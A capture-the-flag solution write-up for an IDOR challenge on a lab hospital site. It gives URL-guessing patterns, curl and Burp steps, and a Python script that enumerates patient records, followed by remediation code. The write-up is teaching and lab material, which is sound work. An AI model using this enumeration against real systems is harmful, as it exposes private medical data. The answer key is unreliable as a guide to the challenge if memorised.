# Solution: Public Patient Records

**Challenge:** Hospital - Chapter 2, Challenge 1
**Difficulty:** Easy
**Points:** 100
**Type:** IDOR (Insecure Direct Object Reference) / Information Disclosure

---

## Challenge Description

The hospital management system stores thousands of patient records. You've heard rumors that Patient ID **999** has interesting information in their medical notes.

**Target:** https://hospital.cyberlab.local

---

## Learning Objectives

After completing this challenge, you will understand:

- **IDOR (Insecure Direct Object Reference)** vulnerabilities
- How web applications expose resources via predictable IDs
- Why proper authorization checks are critical
- How to enumerate resources in web applications
- The importance of access control for sensitive data

---

## Solution Walkthrough

### Step 1: Understanding the Application

1. Navigate to the Hospital website: `https://hospital.cyberlab.local`
2. Explore the application:
   - Look for patient listing pages
   - Check if there's a search function
   - Identify how the application accesses patient records

### Step 2: Identifying the Vulnerability

**IDOR Basics:**
- Applications often use sequential IDs (1, 2, 3, 999, etc.)
- URLs might look like: `/patients/123` or `/api/patients/456`
- If authorization isn't properly implemented, you can access any patient's record by changing the ID

**Common Patterns to Try:**
```
/patients/999
/patient/999
/api/patients/999
/api/v1/patients/999
/patient?id=999
/viewpatient.php?id=999
```

### Step 3: Exploiting the IDOR

**Method 1: Direct URL Access**

Try accessing patient 999 directly in the browser:

```
https://hospital.cyberlab.local/patients/999
```

Or via API:

```
https://hospital.cyberlab.local/api/patients/999
```

**Method 2: Using curl**

```bash
curl https://hospital.cyberlab.local/api/patients/999
```

**Method 3: Using Burp Suite**

1. Intercept a legitimate patient record request
2. Change the patient ID to 999
3. Forward the request
4. View the response

### Step 4: Finding the Flag

Once you access patient 999's record, look for the flag in the **medical notes** field:

```json
{
  "id": 999,
  "name": "CTF Test Patient",
  "age": 45,
  "diagnosis": "Routine Checkup",
  "notes": "Medical History: Patient reports normal health. CTF Flag: CYBERLABFLAG{...}"
}
```

Or in HTML format:

```html
<div class="patient-record">
  <h2>Patient: CTF Test Patient</h2>
  <p><strong>Age:</strong> 45</p>
  <p><strong>Diagnosis:</strong> Routine Checkup</p>
  <p><strong>Notes:</strong> Medical History: Patient reports normal health.
     CTF Flag: CYBERLABFLAG{...}</p>
</div>
```

### Step 5: Extract and Submit Flag

1. Copy the flag: `CYBERLABFLAG{...}`
2. Submit it in CTFd
3. Get 100 points! 🎉

---

## Alternative Methods

### Method A: Enumeration Script

If you want to find all accessible patient IDs:

```python
import requests

base_url = "https://hospital.cyberlab.local/api/patients/"

for patient_id in range(1, 1000):
    response = requests.get(f"{base_url}{patient_id}")
    if response.status_code == 200:
        print(f"[+] Patient {patient_id}: {response.json().get('name')}")
        if 'CTF Flag' in str(response.json()):
            print(f"[!] FLAG FOUND in patient {patient_id}!")
            print(response.json())
```

### Method B: Using Developer Tools

1. Open Browser Developer Tools (F12)
2. Go to Network tab
3. Browse the hospital website normally
4. Look for API calls to `/patients/` or similar
5. Right-click on a request → "Edit and Resend"
6. Change the patient ID to 999
7. View the response

---

## Tools Used

- **Web Browser** - Manual testing
- **curl** - Command-line HTTP requests
- **Burp Suite** - Intercepting and modifying requests (optional)
- **Python requests** - Automation (optional)

---

## Hints Explanation

**Hint 1** (0 points): "Try accessing patient records with different IDs..."
- Tells you to try URLs like `/patients/999`

**Hint 2** (25 points): "IDOR vulnerabilities occur when..."
- Explains the vulnerability type

**Hint 3** (50 points): "Look in the medical notes field..."
- Tells you exactly where the flag is

---

## Key Takeaways

### What is IDOR?

**Insecure Direct Object Reference (IDOR)** is a vulnerability where:
- Application exposes direct references to internal objects (files, database records, etc.)
- Attacker can manipulate these references to access unauthorized data
- Missing or inadequate authorization checks allow access

### Why is This Dangerous?

In a real hospital system, this would allow:
- Unauthorized access to patient medical records (HIPAA violation)
- Privacy breaches
- Identity theft
- Medical fraud

### Real-World Examples

- **2019 - First American Financial:** IDOR exposed 885 million customer records
- **2020 - British Airways:** IDOR allowed booking modifications
- **OWASP Top 10 2021:** Listed as "Broken Access Control" (#1)

---

## Remediation

### How to Fix This Vulnerability

**1. Implement Proper Authorization**

```python
# BAD - No authorization check
@app.route('/patients/<int:patient_id>')
def get_patient(patient_id):
    patient = Patient.query.get(patient_id)
    return jsonify(patient.to_dict())

# GOOD - Check if user is authorized
@app.route('/patients/<int:patient_id>')
@login_required
def get_patient(patient_id):
    patient = Patient.query.get(patient_id)

    # Check if current user can access this patient
    if not current_user.can_access_patient(patient):
        return jsonify({"error": "Unauthorized"}), 403

    return jsonify(patient.to_dict())
```

**2. Use UUIDs Instead of Sequential IDs**

```python
# Instead of: /patients/999
# Use: /patients/a7f3e9b2-1c5d-4e8a-9b7f-3e2a1c5d4e8a

import uuid

class Patient(db.Model):
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
```

**3. Implement Role-Based Access Control (RBAC)**

- Doctors can only access their own patients
- Admins can access all records
- Patients can only access their own data

**4. Add Activity Logging**

- Log all patient record access
- Alert on suspicious patterns (accessing many records quickly)
- Audit trails for compliance

---

## Further Reading

- [OWASP - Insecure Direct Object References](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References)
- [PortSwigger - Access Control Vulnerabilities](https://portswigger.net/web-security/access-control)
- [OWASP Top 10 2021 - A01 Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)

---

## Practice More

Similar challenges to try:
- Try other patient IDs (1-1000) - are there more accessible?
- Look for other IDOR vulnerabilities in the Hospital system
- Check if you can modify patient records (PUT/POST requests)
- Can you delete records you shouldn't have access to?

---

**Congratulations on solving this challenge!** 🎉

You've learned about IDOR vulnerabilities and why proper access control is essential in web applications, especially those handling sensitive data like medical records.
